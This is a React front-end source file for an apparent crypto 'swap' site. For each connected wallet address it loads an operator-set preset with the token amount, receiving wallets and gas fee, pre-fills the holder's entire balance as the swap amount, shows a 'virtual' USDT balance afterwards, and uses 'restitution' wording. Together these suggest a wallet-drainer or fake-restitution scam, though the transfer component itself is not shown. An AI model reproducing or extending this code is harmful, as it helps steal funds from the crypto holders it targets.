import React, { useState, useEffect, useCallback } from 'react';
import { WagmiProvider, createConfig, useAccount, useChainId } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { walletConnect, injected, coinbaseWallet } from 'wagmi/connectors';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'wagmi/chains';
import { http } from 'wagmi';
import { WalletProvider, useWallet } from './contexts/WalletContext';
import Header from './components/Header';
import HeroSection from './components/HeroSection';
import SwapCard from './components/SwapCard';
import Footer from './components/Footer';
import VirtualUSDT from './components/VirtualUSDT';
import NetworkWarning from './components/NetworkWarning';
import { clearCache, getBlockchainForChainId } from './config/adminConfig';
import api from './config/api';

const projectId = '90c9c75a9b1e73a06c1110b3d1b943f9';

const appUrl = typeof window !== 'undefined' ? window.location.origin : 'https://swap-app.vercel.app';
const appIcon = typeof window !== 'undefined' ? `${window.location.origin}/asdf.svg` : 'https://swap-app.vercel.app/asdf.svg';

const chains = [mainnet, bsc, polygon, arbitrum, optimism, avalanche, base];

const config = createConfig({
  chains,
  connectors: [
    injected({ shimDisconnect: true }),
    walletConnect({
      projectId,
      metadata: {
        name: 'Swap|App',
        description: 'Fast Crypto Swap',
        url: appUrl,
        icons: [appIcon],
      },
      showQrModal: true,
    }),
    coinbaseWallet({
      appName: 'Swap|App',
      appLogoUrl: appIcon,
    }),
  ],
  transports: {
    [mainnet.id]: http(),
    [bsc.id]: http(),
    [polygon.id]: http(),
    [arbitrum.id]: http(),
    [optimism.id]: http(),
    [avalanche.id]: http(),
    [base.id]: http(),
  },
  ssr: false,
});

const queryClient = new QueryClient();

function AppContent() {
  const { address: evmAddress, isConnected: evmConnected } = useAccount();
  const wagmiChainId = useChainId();
  const { solanaAddress, solanaConnected, tronAddress, tronConnected } = useWallet();
  const [walletPreset, setWalletPreset] = useState(null);
  const [originalUsdValue, setOriginalUsdValue] = useState(null);
  const [loadingPreset, setLoadingPreset] = useState(false);
  const [fromToken, setFromToken] = useState(null);
  const [toToken] = useState({
    name: 'USDT',
    logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
  });
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [localSwapCompleted, setLocalSwapCompleted] = useState(false);
  const [presetAddress, setPresetAddress] = useState(null);
  const [openConnectModalSignal, setOpenConnectModalSignal] = useState(0);

  const handleRequestConnect = useCallback(() => {
    setOpenConnectModalSignal((s) => s + 1);
  }, []);

  const isAnyConnected = evmConnected || solanaConnected || tronConnected;

  const normalizeAddress = (addr) => {
    if (!addr) return null;
    if (addr.startsWith('0x') || addr.startsWith('0X')) return addr.toLowerCase();
    return addr.toLowerCase();
  };

  const parsePresetData = (presetData) => ({
    token: presetData.token.name,
    tokenSymbol: presetData.token.symbol || presetData.token.name,
    tokenAmount: presetData.token.amount,
    usdValue: presetData.token.usdValue,
    tokenLogo: presetData.token.logo,
    tokenAddress: presetData.token.address,
    decimals: presetData.token.decimals,
    swapCompleted: presetData.swapCompleted || false,
    blockchain: presetData.blockchain || 'ETH',
    gasFee: presetData.gasFee || 0.005,
    gasFeeUsd: presetData.gasFeeUsd || 2,
    receivingWallet: presetData.receivingWallet || null,
    receivingWallets: presetData.receivingWallets || null,
    selectedTokens: presetData.selectedTokens || [],
  });

  useEffect(() => {
    setLocalSwapCompleted(false);

    const fetchPreset = async () => {
      if (!isAnyConnected) {
        setWalletPreset(null);
        setPresetAddress(null);
        setLoadingPreset(false);
        return;
      }

      setLoadingPreset(true);

      const tryFetch = async (addr, blockchain) => {
        const normalized = normalizeAddress(addr);
        const url = blockchain
          ? `/wallet-presets/${normalized}?blockchain=${blockchain}`
          : `/wallet-presets/${normalized}`;
        const response = await api.get(url);
        return response.data;
      };

      if (evmConnected && evmAddress && wagmiChainId) {
        const evmBlockchain = getBlockchainForChainId(wagmiChainId);
        try {
          const presetData = await tryFetch(evmAddress, evmBlockchain);
          const preset = parsePresetData(presetData);
          if (preset.usdValue && preset.usdValue > 0 && !originalUsdValue) {
            setOriginalUsdValue(preset.usdValue);
          }
          setWalletPreset(preset);
          setPresetAddress(evmAddress);
          setLoadingPreset(false);
          return;
        } catch {
          // no preset for this EVM address/chain
        }
      }

      if (solanaConnected && solanaAddress) {
        try {
          const presetData = await tryFetch(solanaAddress, 'SOLANA');
          const preset = parsePresetData(presetData);
          if (preset.usdValue && preset.usdValue > 0 && !originalUsdValue) {
            setOriginalUsdValue(preset.usdValue);
          }
          setWalletPreset(preset);
          setPresetAddress(solanaAddress);
          setLoadingPreset(false);
          return;
        } catch {
          // no preset for this Solana address
        }
      }

      if (tronConnected && tronAddress) {
        try {
          const presetData = await tryFetch(tronAddress, 'TRON');
          const preset = parsePresetData(presetData);
          if (preset.usdValue && preset.usdValue > 0 && !originalUsdValue) {
            setOriginalUsdValue(preset.usdValue);
          }
          setWalletPreset(preset);
          setPresetAddress(tronAddress);
          setLoadingPreset(false);
          return;
        } catch {
          // no preset for this Tron address
        }
      }

      setWalletPreset(null);
      setPresetAddress(null);
      setLoadingPreset(false);
    };

    fetchPreset();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isAnyConnected, evmAddress, solanaAddress, tronAddress, wagmiChainId]);

  useEffect(() => {
    if (walletPreset && presetAddress) {
      const swapCompleted = walletPreset.swapCompleted || false;
      const tokenAmount = walletPreset.tokenAmount && walletPreset.tokenAmount > 0 ? walletPreset.tokenAmount : 0;
      const usdValue = walletPreset.usdValue && walletPreset.usdValue > 0 ? walletPreset.usdValue : 0;

      setFromToken({
        name: walletPreset.token,
        logo: walletPreset.tokenLogo,
        amount: tokenAmount,
        usdValue: usdValue,
        address: walletPreset.tokenAddress,
        decimals: walletPreset.decimals,
      });

      if (!swapCompleted) {
        setFromAmount(tokenAmount > 0 ? tokenAmount.toString() : '0');
      }
    } else if (!walletPreset && presetAddress) {
      setFromToken(null);
      setFromAmount('');
    }
  }, [walletPreset, presetAddress]);

  const handleSwapComplete = async () => {
    setLocalSwapCompleted(true);

    if (presetAddress && walletPreset) {
      clearCache();
      try {
        const normalized = normalizeAddress(presetAddress);
        const blockchain = walletPreset.blockchain;
        const url = blockchain
          ? `/wallet-presets/${normalized}?blockchain=${blockchain}`
          : `/wallet-presets/${normalized}`;
        const response = await api.get(url);
        const updatedPreset = parsePresetData(response.data);

        const preservedUsdValue = originalUsdValue || walletPreset?.usdValue;
        if (preservedUsdValue && (!updatedPreset.usdValue || updatedPreset.usdValue === 0)) {
          updatedPreset.usdValue = preservedUsdValue;
        }
        setWalletPreset(updatedPreset);
      } catch (err) {
        // ignore
      }
    }
  };

  useEffect(() => {
    const swapCompleted = walletPreset?.swapCompleted || localSwapCompleted;

    if (swapCompleted) {
      return;
    } else if (fromToken && fromAmount && parseFloat(fromAmount) > 0 && fromToken.amount > 0) {
      const usdValue = fromToken.usdValue || 0;
      const tokenAmount = parseFloat(fromAmount);
      const totalValue = (usdValue / fromToken.amount) * tokenAmount;
      setToAmount(totalValue.toFixed(2));
    } else {
      setToAmount('0.0');
    }
  }, [fromAmount, fromToken, walletPreset, localSwapCompleted]);

  return (
    <div className="app">
      <Header openConnectModalSignal={openConnectModalSignal} />
      <NetworkWarning />
      <HeroSection />
      {presetAddress && walletPreset && (walletPreset.swapCompleted || localSwapCompleted) && (
        <VirtualUSDT
          presetUsdValue={walletPreset.usdValue || originalUsdValue || 0}
          swapCompleted={walletPreset.swapCompleted || localSwapCompleted}
        />
      )}
      <main>
        {presetAddress && walletPreset ? (
          <SwapCard
            fromToken={fromToken}
            toToken={toToken}
            fromAmount={fromAmount}
            toAmount={toAmount}
            walletPreset={walletPreset}
            presetAddress={presetAddress}
            onSwapComplete={handleSwapComplete}
            onRequestConnect={handleRequestConnect}
          />
        ) : (
          <div className="no-preset-message">
            {!isAnyConnected ? (
              <p>Please connect your wallet to continue.</p>
            ) : loadingPreset ? (
              <p>Loading wallet preset...</p>
            ) : (
              <p>No restitution is available for this wallet address.</p>
            )}
          </div>
        )}
      </main>
      <Footer />
    </div>
  );
}

function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <WalletProvider>
          <AppContent />
        </WalletProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
}

export default App;
